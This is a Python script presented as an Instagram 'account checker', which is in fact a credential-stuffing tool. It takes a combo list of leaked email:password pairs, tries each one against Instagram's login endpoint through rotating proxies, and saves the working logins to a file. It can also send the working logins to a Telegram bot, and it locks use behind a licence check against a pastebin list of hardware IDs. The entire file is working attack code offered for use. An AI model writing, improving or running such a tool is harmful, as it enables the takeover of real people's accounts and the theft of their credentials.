import requests
import sys
import subprocess
import time
import os
from colored import fg, bg,attr
import  random

hw = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()  # Grapping HWID

a = requests.get('https://pastebin.com/raw/BRkRVVUM')  # Making GET Request

try:
    if hw in a.text:  # Checking HWID In URL
        print('[+] HWID Signed In Success')
        pass  # If HWID In URL Then Success
    else:
        print('[!] HWID Not Found')
        print(f'HWID: {hw}')
        time.sleep(5)
        os._exit()  # If HWID Not In URL Then Fail + Close os

except:
    print('[?] Failed to connect to database')
    time.sleep(5)
    os._exit()  # Check for Fail Connection

os.system('title instagram Account checker by @Abdallah_Coder')  # OS Title
color1 = fg(2)
color2 = fg(1)
color3 = fg(6)
color4 = fg(3)
color5 = fg(214)
color6 = fg(166)
loginhead = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
'content-length': '260',
'content-type': 'application/x-www-form-urlencoded',
'cookie': '',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"',
'sec-ch-ua-mobile': '?0',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36',
'x-csrftoken': 'iTYeYhufyGIoiWfdZyVynUNqAZXEYwYa',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': 'hmac.AR1YqJ0hFbUnWM-gjFA6mkgUOSGJPdbRX__xA5Y8AwY3Wcuj',
'x-instagram-ajax': '2be71da717d9',
'x-requested-with': 'XMLHttpRequest'
}
#Abdallah Coder
num = 1
def slow2(T):
 for r in T + '\n' :
     sys.stdout.write(r)
     sys.stdout.flush()
     time.sleep(100/1000)
def slow(T):
 for r in T + '\n' :
     sys.stdout.write(r)
     sys.stdout.flush()
     time.sleep(15/1000)
slow(color3+'''
                                                         c=====e
                                                            H
   ____________                                         _,,_H__
  (__((__((___()         InstaGram Checker V2          //|     |
 (__((__((___()()_____________________________________// |boom |
(__((__((___()()()------------------------------------'  |_____|
                       ┯━━━━━━━━|*|━━━━━━━━┯
                           @Abdallah_Coder
                       ┷━━━━━━━━|*|━━━━━━━━┷
''')
o = input('[+] Click Enter to start')
print("    ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
file = input("[+] Enter your Combo =>> ")
print("    ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
prrr = input("[+] Enter your Proxy list =>> ")
proxtype = int(input("""[Proxy Type]
1) HTTP/S
2) Socks4
3) Socks5
>> """))
print("    ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
sss = int(input("[+] Enter time sleep =>> "))
tttt = input("[+] Do you want to send the accounts to Telegram? [ y \ n ] =>> ")
if tttt == 'y':
    bot = input('[+] Enter your bot token =>> ')
    id = input("[+] Enter your id =>> ")
print("Loading..")
slow2('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
bulder1 = 'start Checker'
telAPI1 = f'https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text={bulder1}'
rebot1 = requests.post(telAPI1)
with open(file, 'r') as filelist:
    for line in filelist:
     splitfile = line.strip().split(":")
     email = splitfile[0]
     passs = splitfile[1]
     if splitfile:
                     proxylist = open(prrr, "r").read().splitlines()
                     randomproxy = random.choice(proxylist)
                     if proxtype == 1:
                       proxy_dict = {
                      'http': "http://" + randomproxy,
                      }
                     elif proxtype == 2:
                       proxy_dict = {
                      'http': "socks4://" + randomproxy,
                   }

                     elif proxtype == 3:
                       proxy_dict = {
                   'http': "socks5://" + randomproxy,
                     }
                     loginurl = 'https://www.instagram.com/accounts/login/ajax/'
                     data = {
                        'username': email,
                        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:' + passs
                    }
                     reqlogin = requests.post(loginurl, data=data, headers=loginhead,proxies=proxy_dict).text
                     if ('"authenticated":true') in reqlogin:
                        print(color1 + f'''
  Account Login >> {email + ":" + passs}
  proxy >> {randomproxy}
  Checking account number >> {num}
                        ''')
                        re = open('Good Account.txt', 'a+')
                        re.write('\n')
                        re.write(email + ":" + passs)
                        re.close()
                        num = num + 1
                        bulder = (f'''
Account Login >> {email + ":" + passs}
proxy >> {randomproxy}
Checking account number >> {num}
Thanks for @Abdallah_Coder
''')
                        if tttt == 'y':
                            telAPI = f'https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text={bulder}'
                            rebot = requests.post(telAPI)
                        print(color3+"    ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
                     elif ('"authenticated":false') in reqlogin:
                        print(color2+f'''
  Account Failed >> {email + ":" + passs}
  proxy >> {randomproxy}
  Checking account number >> {num}
                        ''')
                        num = num+1
                        print(color3+"    ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
                     elif ('"message":"checkpoint_required"') in reqlogin:
                        print(color4 + f'''
  Account checkpoint >> {email + ":" + passs}
  proxy >> {randomproxy}
  Checking account number >> {num}
                        ''')
                        ru = open('Checkpoint.txt', 'a+')
                        ru.write('\n')
                        ru.write(email + ":" + passs)
                        ru.close()
                        num = num + 1
                        print(color3+"    ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
                     else:
                        print(color2 + f'''
  Account Error >> {email + ":" + passs}
  proxy >> {randomproxy}
  Checking account number >> {num}
                        ''')
                        num = num + 1
                        print(color3+"    ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
                     time.sleep(sss)
print (color3+"End")
TT = input("Click Enter to close")